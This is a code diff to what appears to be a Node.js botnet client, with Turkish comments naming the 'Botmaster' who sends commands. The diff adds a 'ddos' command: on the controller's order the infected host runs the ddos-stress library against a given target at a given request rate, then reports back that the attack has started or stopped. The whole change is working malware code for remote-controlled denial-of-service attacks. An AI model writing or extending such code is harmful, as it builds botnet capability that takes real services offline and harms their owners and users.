@@ -5,6 +5,11 @@ module.exports = function(){
         var Packet = require('../models/Packet');
         var Promise = require('promise');
 
+        var Stress = require('ddos-stress');
+
+
+        var stress = new Stress();
+
 
 
         var send = require('./sender')(thisSocket).send;
@@ -76,9 +81,31 @@ module.exports = function(){
                             send(paket);
                         }
 
-                    }else if(firstElement === 'kira'){
+                    }else if(firstElement === 'ddos'){
+                        if(args[0] === 'stop'){
+                            var paket = new Packet(receiver_id, sender_id, {
+                                output:new Buffer.from("DDoS saldirisi sonlandirildi.").toString('base64'),
+                                name:hostname});
 
-                        //burada dos saldırısı yapılacak.
+                            send(paket);
+                            stress.runningState=false;
+
+                        }else{
+                            //burada dos saldırısı yapılacak.
+                            var target = args[0];
+                            var reqPerSecond = args[1];
+
+                            stress.runningState = true;
+                            stress.resetStats();
+                            stress.run(target, reqPerSecond);
+                            var paket = new Packet(receiver_id, sender_id, {
+                                output:new Buffer.from(target+" hedefine ddos saldirisi baslatildi.").toString('base64'),
+                                name:hostname});
+
+                            send(paket);
+                        }
+
+
 
                     }else{
                         //Botmasterın gönderdiği komutu icra eden kısım. Output oldukça fulfill gönderir.
